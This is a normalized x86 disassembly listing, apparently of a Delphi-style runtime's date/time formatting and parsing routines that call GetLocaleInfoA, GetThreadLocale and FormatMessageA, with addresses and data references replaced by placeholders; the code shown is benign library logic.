xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ae23
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae2a
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404450
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
call sub_40ca4c
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a300
pop ecx
mov al [ eax + lookup_table_40a785 ]
jmp [ eax * 4 + jump_table_40a7be ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a3dc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40a454
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40a344
pop ecx
jmp r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a5bc
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40a344
pop ecx
jmp r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a3b0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a414
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a414
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a414
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a3b0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40a3b0
pop ecx
push ebp
call sub_40a414
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40a414
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
push ebp
call sub_40a3b0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
push ebp
call sub_40a414
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40a364
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40a364
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40a300
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a300
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a300
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40a1ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40a300
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_40a300
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40a1ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40ca4c
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40a300
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40a364
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40a1ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a344
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a344
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40ca4c
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a6c4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a300
pop ecx
jmp r-xdata
push ebp
call sub_40a3dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40a1ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a344
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4090fc
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4090fc
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4090fc
test eax eax
jne r-xdata
jmp r-xdata
sub_40ae54
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a6c4
pop ecx
push ebp
mov eax ebx
call sub_40a6c4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40451c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40aec8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4046e4
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40aeec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40aec8
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4046e4
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40af80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aff9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b000
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40aec8
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4046e4
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40493c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408800
test eax eax
jne r-xdata
mov eax edi
call sub_4046e4
add [ esi ] eax
mov bl 0x1
sub_40b00c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40aec8
mov eax esi
call sub_4046e4
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40b044
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4046e4
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40b090
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4046e4
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40ca90
mov [ ebx ] eax
jmp r-xdata
sub_40b0d8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4048dc
push eax
mov eax [ ebx ]
call sub_4048dc
pop edx
call sub_40cc08
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40b12c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40a2ec
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40b188
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b49a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40b044
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40cb44
test eax eax
jle r-xdata
mov edx ebx
mov eax esi
call sub_40b090
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40493c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408870
mov eax [ ebp - 0x1c ]
call sub_40b0d8
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40aeec
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4a1
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404450
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40b00c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40aeec
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40b00c
test al al
je r-xdata
call sub_40a2ec
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40aeec
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409ed8
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404a20
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40b00c
mov edx ebx
mov eax esi
call sub_40aec8
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4046e4
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40b090
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40b12c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40aec8
mov eax esi
call sub_4046e4
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40a2ec
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4046e4
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40493c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408800
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4046e4
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40493c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408800
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b4c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40af80
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40af80
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40af80
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40aeec
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40aec8
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40af80
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40b00c
test al al
je r-xdata
mov [ esp + 0x8 ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40b00c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40aeec
test al al
je r-xdata
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40b00c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40aeec
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40aeec
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40af80
test al al
jne r-xdata
mov edx esi
mov eax ebp
call sub_40aec8
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409d90
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40af80
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40af80
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40af80
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b6b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b4c4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4046e4
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b6ec
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_40b720
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0xb
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408578
sub_40b720
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40b188
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b6b8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4046e4
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b4c4
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b7ac
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3000
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40451c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b7f8
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404480
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40451c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b844
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b86c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b7f8
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_406660
sub_40b8a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b9bb
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b86c
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404480
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b86c
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404480
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
